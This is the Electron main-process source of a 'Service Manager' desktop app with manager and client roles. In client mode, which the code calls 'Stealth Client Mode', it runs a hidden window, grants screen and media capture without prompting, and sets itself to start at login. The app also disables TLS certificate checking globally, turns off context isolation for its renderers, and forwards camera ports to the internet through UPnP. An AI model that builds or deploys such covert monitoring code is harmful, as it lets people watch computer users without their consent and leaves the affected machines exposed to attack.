const { app, BrowserWindow, ipcMain, desktopCapturer } = require('electron');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

const CONFIG_PATH = path.join(app.getPath('userData'), 'app-config.json');

let mainWindow;
let nextProcess;

// Lazy-load managers (only when needed in Manager mode)
let go2rtcManager = null;
let upnpManager = null;

// We need to bypass some SSL errors if Next.js throws any
app.commandLine.appendSwitch('ignore-certificate-errors');

function getConfig() {
  let config = null;
  const { execSync } = require('child_process');

  // 1. Read registry FIRST (set by NSIS installer — always takes priority)
  try {
    let regOutput = '';
    try {
      regOutput = execSync('reg query HKCU\\Software\\ServiceManager /v Role 2>nul').toString();
    } catch(e) {
      try {
        regOutput = execSync('reg query HKLM\\Software\\ServiceManager /v Role 2>nul').toString();
      } catch(e2) {}
    }

    if (regOutput && regOutput.includes('REG_SZ')) {
      const match = regOutput.match(/REG_SZ\s+(\w+)/);
      if (match && match[1]) {
        const role = match[1].toLowerCase();
        if (role === 'manager' || role === 'client') {
          config = { role };
          console.log('[main] Role from registry:', role);
          // Save to file and clean up registry
          saveConfig(config);
          try {
            execSync('reg delete HKCU\\Software\\ServiceManager /v Role /f 2>nul');
            execSync('reg delete HKLM\\Software\\ServiceManager /v Role /f 2>nul');
          } catch(e3) {}
          return config;
        }
      }
    }
  } catch (e) { console.error('[main] registry read error:', e); }

  // 2. Fall back to config file
  try {
    if (fs.existsSync(CONFIG_PATH)) {
      config = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf-8'));
      console.log('[main] Role from config file:', config?.role);
    }
  } catch (e) { console.error(e); }

  return config;
}

function saveConfig(config) {
  fs.writeFileSync(CONFIG_PATH, JSON.stringify(config));
}

const { execSync, exec } = require('child_process');

// Handle --uninstall command-line flag
if (process.argv.includes('--uninstall')) {
  performUninstall();
  process.exit(0);
}

app.whenReady().then(() => {
  const config = getConfig();
  
  if (!config) {
    showSetup();
  } else if (config.role === 'manager') {
    startManager();
  } else if (config.role === 'client') {
    startClient();
  }
});

function showSetup() {
  mainWindow = new BrowserWindow({
    width: 600,
    height: 500,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    }
  });
  mainWindow.loadFile(path.join(__dirname, 'setup.html'));
}

ipcMain.on('setup-complete', (event, role) => {
  saveConfig({ role });
  if (role === 'client') {
    app.setLoginItemSettings({
      openAtLogin: true,
      path: process.execPath
    });
  }
  
  app.relaunch();
  app.exit();
});

// Allow renderer to ask for desktop sources (for screen sharing in Stealth Mode)
ipcMain.handle('get-desktop-source', async () => {
  const sources = await desktopCapturer.getSources({ types: ['screen'] });
  if (sources.length > 0) return sources[0].id;
  return null;
});

// Lock workstation command
ipcMain.handle('lock-workstation', () => {
  try {
    exec('rundll32.exe user32.dll,LockWorkStation');
    return { success: true };
  } catch (e) {
    return { error: e.message };
  }
});

// Get system telemetry
ipcMain.handle('get-system-info', () => {
  const os = require('os');
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    uptime: os.uptime(),
    totalmem: os.totalmem(),
    freemem: os.freemem(),
    cpus: os.cpus()?.length || 1,
  };
});

// Switch role (Manager <-> Client)
ipcMain.handle('switch-role', (event, newRole) => {
  saveConfig({ role: newRole });
  if (newRole === 'client') {
    app.setLoginItemSettings({ openAtLogin: true, path: process.execPath });
  } else {
    app.setLoginItemSettings({ openAtLogin: false, path: process.execPath });
  }
  app.relaunch();
  app.exit(0);
});

// IPC: Camera-related commands from renderer
ipcMain.handle('go2rtc-add-stream', async (event, name, url) => {
  if (go2rtcManager) return go2rtcManager.addStream(name, url);
  return { error: 'go2rtc not running' };
});

ipcMain.handle('go2rtc-remove-stream', async (event, name) => {
  if (go2rtcManager) return go2rtcManager.removeStream(name);
  return { error: 'go2rtc not running' };
});

ipcMain.handle('go2rtc-get-streams', async () => {
  if (go2rtcManager) return go2rtcManager.getStreams();
  return {};
});

ipcMain.handle('go2rtc-webrtc-offer', async (event, name, offer) => {
  if (go2rtcManager) return go2rtcManager.getWebRTCOffer(name, offer);
  return { error: 'go2rtc not running' };
});

ipcMain.handle('upnp-status', async () => {
  if (!upnpManager) return { available: false, externalIp: null, mappings: [] };
  return {
    available: upnpManager.isAvailable(),
    externalIp: upnpManager.getExternalIp(),
    mappings: upnpManager.getMappings()
  };
});

ipcMain.handle('upnp-forward-camera', async (event, cameraIp, cameraPort, externalPort, description) => {
  if (upnpManager) return upnpManager.forwardCameraPort(cameraIp, cameraPort, externalPort, description);
  return false;
});

// Write UPnP status to shared file for Next.js API
function writeUpnpStatus() {
  if (!upnpManager) return;
  try {
    const statusDir = path.join(process.env.APPDATA || app.getPath('userData'), 'ipc');
    if (!fs.existsSync(statusDir)) fs.mkdirSync(statusDir, { recursive: true });
    const statusPath = path.join(statusDir, 'upnp-status.json');
    const externalIp = upnpManager.getExternalIp();
    fs.writeFileSync(statusPath, JSON.stringify({
      available: upnpManager.isAvailable(),
      externalIp,
      mappings: upnpManager.getMappings(),
      cgnat: externalIp ? (
        externalIp.startsWith('10.') ||
        externalIp.startsWith('192.168.') ||
        /^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./.test(externalIp)
      ) : false,
      updatedAt: Date.now()
    }));
  } catch (e) {
    console.error('[main] Failed to write UPnP status:', e.message);
  }
}

function startManager() {
  // In packaged app: standalone is in resources/standalone/
  // In dev mode: standalone is in .next/standalone/
  const standalonePath = app.isPackaged
    ? path.join(process.resourcesPath, 'standalone')
    : path.join(__dirname, '..', '..', '.next', 'standalone');

  // Kill any existing process on port 4321 before starting
  try {
    const { execSync } = require('child_process');
    const output = execSync('netstat -ano 2>nul | findstr :4321').toString();
    output.split('\n').forEach(line => {
      const parts = line.trim().split(/\s+/);
      const pid = parts[parts.length - 1];
      if (pid && /^\d+$/.test(pid) && pid !== '0') {
        try { execSync(`taskkill /PID ${pid} /F 2>nul`); } catch(e) {}
      }
    });
    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 800);
  } catch(e) {}
  
  // Start Next.js child process
  if (fs.existsSync(path.join(standalonePath, 'server.js'))) {
    nextProcess = spawn(process.execPath, ['server.js'], {
      cwd: standalonePath,
      env: { ...process.env, PORT: '4321', ELECTRON_RUN_AS_NODE: '1' },
      detached: false
    });

    nextProcess.stdout.on('data', (data) => {
      console.log(`Next.js: ${data}`);
    });
    nextProcess.stderr.on('data', (data) => {
      console.error(`Next.js Error: ${data}`);
    });
  } else {
    console.error('No standalone/server.js found! Please run npm run build first.');
  }

  // Start go2rtc engine
  try {
    go2rtcManager = require('./go2rtc-manager');
    go2rtcManager.start(app.getPath('userData'));
    console.log('[main] go2rtc engine started');
  } catch (e) {
    console.error('[main] Failed to start go2rtc:', e.message);
  }

  // Start UPnP port forwarding
  try {
    upnpManager = require('./upnp-manager');
    upnpManager.start().then(() => {
      // Write UPnP status to a shared file for Next.js API to read
      writeUpnpStatus();
      // Periodically update the status file
      setInterval(writeUpnpStatus, 60000);
    });
    console.log('[main] UPnP manager started');
  } catch (e) {
    console.error('[main] Failed to start UPnP:', e.message);
  }

  // Delay opening window to give Next.js time to start
  setTimeout(() => {
    mainWindow = new BrowserWindow({
      width: 1280,
      height: 800,
      autoHideMenuBar: true,
      webPreferences: {
        nodeIntegration: false
      }
    });
    
    // Redirect / to /manager
    mainWindow.webContents.on('did-fail-load', () => {
      setTimeout(() => mainWindow.loadURL('http://localhost:4321/manager'), 2000);
    });

    mainWindow.loadURL('http://localhost:4321/manager');
  }, 3000);
}

function startClient() {
  // Stealth Client Mode
  mainWindow = new BrowserWindow({
    show: false, // Run completely hidden
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    }
  });
  
  // Auto-grant media permissions for stealth capture
  mainWindow.webContents.session.setPermissionRequestHandler((webContents, permission, callback) => {
    if (permission === 'media') {
      callback(true);
    } else {
      callback(false);
    }
  });
  
  // Allow accessing screen capture without prompt
  mainWindow.webContents.session.setPermissionCheckHandler((webContents, permission) => {
    return permission === 'media';
  });

  mainWindow.loadFile(path.join(__dirname, 'stealth.html'));
}

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin' && getConfig()?.role !== 'client') {
    app.quit();
  }
});

app.on('before-quit', async () => {
  if (nextProcess) {
    nextProcess.kill();
  }
  if (go2rtcManager) {
    go2rtcManager.stop();
  }
  if (upnpManager) {
    try { await upnpManager.stop(); } catch (e) {}
  }
});

// === UNINSTALL ===

function performUninstall() {
  console.log('[uninstall] Starting uninstall...');
  
  try {
    // 1. Remove auto-start from Windows registry
    try {
      app.setLoginItemSettings({ openAtLogin: false, path: process.execPath });
      console.log('[uninstall] Removed auto-start');
    } catch (e) {
      console.log('[uninstall] Auto-start removal skipped:', e.message);
    }

    // 2. Delete config file
    try {
      if (fs.existsSync(CONFIG_PATH)) {
        fs.unlinkSync(CONFIG_PATH);
        console.log('[uninstall] Deleted config');
      }
    } catch (e) {}

    // 3. Find and run the NSIS uninstaller
    const installDir = path.dirname(process.execPath);
    const uninstallerName = 'Uninstall Service Manager.exe';
    const uninstallerPath = path.join(installDir, uninstallerName);
    
    if (fs.existsSync(uninstallerPath)) {
      console.log('[uninstall] Running NSIS uninstaller:', uninstallerPath);
      // /S = silent mode
      exec(`"${uninstallerPath}" /S`, (err) => {
        if (err) console.error('[uninstall] Uninstaller error:', err.message);
      });
    } else {
      // Fallback: clean up install directory manually
      console.log('[uninstall] No NSIS uninstaller found, cleaning up manually...');
      
      // Remove uninstall registry keys
      try {
        execSync('reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{com.ipc.servicemanager}" /f 2>nul', { stdio: 'ignore' });
        execSync('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{com.ipc.servicemanager}" /f 2>nul', { stdio: 'ignore' });
      } catch (e) {}

      // Schedule self-deletion after exit (Windows can't delete running exe)
      const batPath = path.join(require('os').tmpdir(), 'sm_cleanup.bat');
      const batContent = `@echo off\ntimeout /t 3 /nobreak >nul\nrmdir /s /q "${installDir}"\ndel "%~f0"\n`;
      fs.writeFileSync(batPath, batContent);
      exec(`cmd /c "${batPath}"`, { detached: true, stdio: 'ignore' });
    }

    // 4. Clean up userData
    try {
      const userDataDir = app.getPath('userData');
      if (fs.existsSync(userDataDir)) {
        fs.rmSync(userDataDir, { recursive: true, force: true });
        console.log('[uninstall] Cleaned userData');
      }
    } catch (e) {}

    console.log('[uninstall] Uninstall complete');
  } catch (err) {
    console.error('[uninstall] Error:', err.message);
  }
}

// IPC: Uninstall from dashboard
ipcMain.handle('uninstall-app', async () => {
  performUninstall();
  setTimeout(() => {
    app.quit();
  }, 1000);
  return { success: true };
});

// IPC: Reset to setup screen (re-choose role)
ipcMain.handle('reset-config', async () => {
  try {
    if (fs.existsSync(CONFIG_PATH)) {
      fs.unlinkSync(CONFIG_PATH);
    }
    app.relaunch();
    app.exit();
    return { success: true };
  } catch (e) {
    return { error: e.message };
  }
});
